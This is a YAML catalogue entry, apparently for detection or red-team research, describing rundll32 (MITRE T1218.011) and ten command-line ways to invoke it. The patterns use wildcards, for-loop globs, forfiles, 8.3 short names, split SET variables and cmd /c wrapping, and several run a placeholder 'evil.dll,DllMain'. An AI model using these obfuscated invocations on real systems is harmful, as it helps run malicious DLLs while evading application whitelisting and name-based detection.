---
Name: rundll32
Description: "Loads and runs DLLs. Used to execute malicious DLL exports directly, bypassing application whitelisting."
Platform: windows-cmd
BinaryPath:
  - C:\Windows\System32\rundll32.exe
  - C:\Windows\SysWOW64\rundll32.exe
Category: execution
MitreID: T1218.011
Patterns:
  - Pattern: "for /f %i in ('where rundll3?.exe') do %i"
    Wildcards: ["?"]
    Notes: "Wildcard replaces '2'"
  - Pattern: "for /f %i in ('where r*32.exe') do %i"
    Wildcards: ["*"]
    Notes: "Star matches 'undll'"
  - Pattern: "for /f %i in ('where rundll*.exe') do %i"
    Wildcards: ["*"]
    Notes: "Star matches '32'"
  - Pattern: "for /f %i in ('dir /b C:\\Windows\\System32\\rundll*.exe') do %i"
    Wildcards: ["*"]
    Notes: "dir glob search"
  - Pattern: "for %i in (C:\\Windows\\System32\\rundll*.exe) do @%i evil.dll,DllMain"
    Wildcards: ["*"]
    Notes: "Native CMD for loop with filesystem glob — expands rundll*.exe directly in System32 without where.exe"
    Method: "Simple for glob"
  - Pattern: "for /f %i in ('where /r C:\\Windows rundll*.exe') do %i evil.dll,DllMain"
    Wildcards: ["*"]
    Notes: "Recursive where search across Windows tree — finds rundll32.exe in System32 and SysWOW64"
    Method: "where /r recursive"
  - Pattern: "forfiles /p C:\\Windows\\System32 /m rundll*.exe /c \"@file evil.dll,DllMain\""
    Wildcards: ["*"]
    Notes: "forfiles * mask finds rundll32.exe — @file expands to matched filename for DLL execution"
  - Pattern: "C:\\Windows\\System32\\RUNDLL~1.EXE evil.dll,DllMain"
    Wildcards: []
    Notes: "8.3 SFN — RUNDLL~1 auto-generated for rundll32.exe; requires NtfsDisable8dot3NameCreation=0"
  - Pattern: "set a=rundll& set b=32& call %a%%b%.exe evil.dll,DllMain"
    Wildcards: []
    Notes: "Binary name split across two SET variables — CALL resolves %a%%b%.exe=rundll32.exe; name never appears as a literal string"
    Method: "set variable building"
  - Pattern: "cmd /c for /f %i in ('where rundll*.exe') do %i evil.dll,DllMain"
    Wildcards: ["*"]
    Notes: "cmd /c wrapper adds an extra process layer — glob resolves via where; parent process becomes cmd.exe not the caller"
    Method: "cmd /c indirection"
Resources:
  - https://attack.mitre.org/techniques/T1218/011/
  - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
---
